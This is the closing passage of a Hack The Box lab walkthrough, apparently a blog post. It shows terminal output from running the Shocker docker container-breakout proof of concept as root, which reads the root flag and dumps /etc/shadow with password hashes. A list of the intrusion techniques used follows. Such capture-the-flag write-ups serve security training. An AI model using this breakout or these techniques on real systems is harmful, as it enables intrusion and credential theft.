━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 17.2/17.2 KB • ? • 0:00:00</span><br><span class="line">[10:53:57] uploaded 17.21KiB <span class="keyword">in</span> 4.49 seconds                                                                            upload.py:76</span><br><span class="line">(<span class="built_in">local</span>) pwncat$ back</span><br><span class="line">(remote) root@c150397ccd63:/root<span class="comment"># chmod 777 *</span></span><br><span class="line">(remote) root@c150397ccd63:/root<span class="comment"># ./static</span></span><br><span class="line">[***] docker VMM-container breakout Po(C) 2014             [***]</span><br><span class="line">[***] The tea from the 90<span class="string">&#x27;s kicks your sekurity again.     [***]</span></span><br><span class="line"><span class="string">[***] If you have pending sec consulting, I&#x27;</span>ll happily     [***]</span><br><span class="line">[***] forward to my friends <span class="built_in">who</span> drink secury-tea too!      [***]</span><br><span class="line"></span><br><span class="line">&lt;enter&gt;</span><br><span class="line"></span><br><span class="line">[*] Resolving <span class="string">&#x27;root/root.txt&#x27;</span></span><br><span class="line">[*] Found lib32</span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found lost+found</span><br><span class="line">[*] Found sbin</span><br><span class="line">[*] Found bin</span><br><span class="line">[*] Found boot</span><br><span class="line">[*] Found dev</span><br><span class="line">[*] Found run</span><br><span class="line">[*] Found lib64</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found var</span><br><span class="line">[*] Found home</span><br><span class="line">[*] Found media</span><br><span class="line">[*] Found proc</span><br><span class="line">[*] Found etc</span><br><span class="line">[*] Found lib</span><br><span class="line">[*] Found libx32</span><br><span class="line">[*] Found cdrom</span><br><span class="line">[*] Found root</span><br><span class="line">[+] Match: root ino=18</span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (root) Trying: 0x00000000</span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[*] Resolving <span class="string">&#x27;root.txt&#x27;</span></span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found .backup</span><br><span class="line">[*] Found .config</span><br><span class="line">[*] Found .cache</span><br><span class="line">[*] Found .<span class="built_in">local</span></span><br><span class="line">[*] Found .ssh</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found .profile</span><br><span class="line">[*] Found .bashrc</span><br><span class="line">[*] Found root.txt</span><br><span class="line">[+] Match: root.txt ino=110097</span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (root.txt) Trying: 0x00000000</span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[!] Got a final handle!</span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[!] Win! /etc/shadow output follows:</span><br><span class="line">99a37c0a5b01ffc4ad1204d0dd1bc884</span><br><span class="line"></span><br><span class="line">(remote) root@c150397ccd63:/root<span class="comment"># ./shadow </span></span><br><span class="line">[***] docker VMM-container breakout Po(C) 2014             [***]</span><br><span class="line">[***] The tea from the 90<span class="string">&#x27;s kicks your sekurity again.     [***]</span></span><br><span class="line"><span class="string">[***] If you have pending sec consulting, I&#x27;</span>ll happily     [***]</span><br><span class="line">[***] forward to my friends <span class="built_in">who</span> drink secury-tea too!      [***]</span><br><span class="line"></span><br><span class="line">&lt;enter&gt;</span><br><span class="line"></span><br><span class="line">[*] Resolving <span class="string">&#x27;etc/shadow&#x27;</span></span><br><span class="line">[*] Found lib32</span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found lost+found</span><br><span class="line">[*] Found sbin</span><br><span class="line">[*] Found bin</span><br><span class="line">[*] Found boot</span><br><span class="line">[*] Found dev</span><br><span class="line">[*] Found run</span><br><span class="line">[*] Found lib64</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found var</span><br><span class="line">[*] Found home</span><br><span class="line">[*] Found media</span><br><span class="line">[*] Found proc</span><br><span class="line">[*] Found etc</span><br><span class="line">[+] Match: etc ino=393217</span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (etc) Trying: 0x00000000</span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x01, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[*] Resolving <span class="string">&#x27;shadow&#x27;</span></span><br><span class="line">[*] Found modules-load.d</span><br><span class="line">[*] Found lsb-release</span><br><span class="line">[*] Found rsyslog.conf</span><br><span class="line">[*] Found rc6.d</span><br><span class="line">[*] Found calendar</span><br><span class="line">[*] Found fstab</span><br><span class="line">[*] Found shadow</span><br><span class="line">[+] Match: shadow ino=393228</span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (shadow) Trying: 0x00000000</span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x0c, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[!] Got a final handle!</span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x0c, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[!] Win! /etc/shadow output follows:</span><br><span class="line">root:$6$9GrOpvcijuCP93rg<span class="variable">$tkcyh</span>.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::</span><br><span class="line">daemon:*:18659:0:99999:7:::</span><br><span class="line">bin:*:18659:0:99999:7:::</span><br><span class="line">sys:*:18659:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18659:0:99999:7:::</span><br><span class="line">games:*:18659:0:99999:7:::</span><br><span class="line">man:*:18659:0:99999:7:::</span><br><span class="line">lp:*:18659:0:99999:7:::</span><br><span class="line">mail:*:18659:0:99999:7:::</span><br><span class="line">news:*:18659:0:99999:7:::</span><br><span class="line">uucp:*:18659:0:99999:7:::</span><br><span class="line">proxy:*:18659:0:99999:7:::</span><br><span class="line">www-data:*:18659:0:99999:7:::</span><br><span class="line">backup:*:18659:0:99999:7:::</span><br><span class="line">list:*:18659:0:99999:7:::</span><br><span class="line">irc:*:18659:0:99999:7:::</span><br><span class="line">gnats:*:18659:0:99999:7:::</span><br><span class="line">nobody:*:18659:0:99999:7:::</span><br><span class="line">systemd-network:*:18659:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18659:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18659:0:99999:7:::</span><br><span class="line">messagebus:*:18659:0:99999:7:::</span><br><span class="line">syslog:*:18659:0:99999:7:::</span><br><span class="line">_apt:*:18659:0:99999:7:::</span><br><span class="line">tss:*:18659:0:99999:7:::</span><br><span class="line">uuidd:*:18659:0:99999:7:::</span><br><span class="line">tcpdump:*:18659:0:99999:7:::</span><br><span class="line">landscape:*:18659:0:99999:7:::</span><br><span class="line">pollinate:*:18659:0:99999:7:::</span><br><span class="line">usbmux:*:18849:0:99999:7:::</span><br><span class="line">sshd:*:18849:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18849::::::</span><br><span class="line">lxd:!:18849::::::</span><br><span class="line">saul:$6<span class="variable">$19rUyMaBLt7</span>.CDGj<span class="variable">$ik84VX1CUhhuiMHxq8hSMjKTDMxHt</span>.ldQC15vFyupafquVyonyyb3/S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>we see both Dynamic compilation and Static compilation file works, we are done</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2208.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2209.jpg"></p>
+</li>
+</ul>
+<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
+<li>RJ editor get shell</li>
+<li>pwncat upload and download files</li>
+<li>bolt cms get shell</li>
+<li>chisel port forward MongoDB 27017 port</li>
+<li>update admin’s bcrypt hash to change the password</li>
+<li>rocket.chat rce</li>
+<li>shocker: docker PoC VMM-container breakout to get root flag</li>
+</ul>
+<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2022/04/10/talkactive/" title="Hack-The-Box-walkthrough[talkactive]">https://fdlucifer.github.io/2022/04/10/talkactive/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/03/27/timelapse/" rel="prev" title="Hack-The-Box-walkthrough[timelapse]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[timelapse]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/04/10/Perspective/" rel="next" title="Hack-The-Box-walkthrough[Perspective]">
+                  Hack-The-Box-walkthrough[Perspective] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
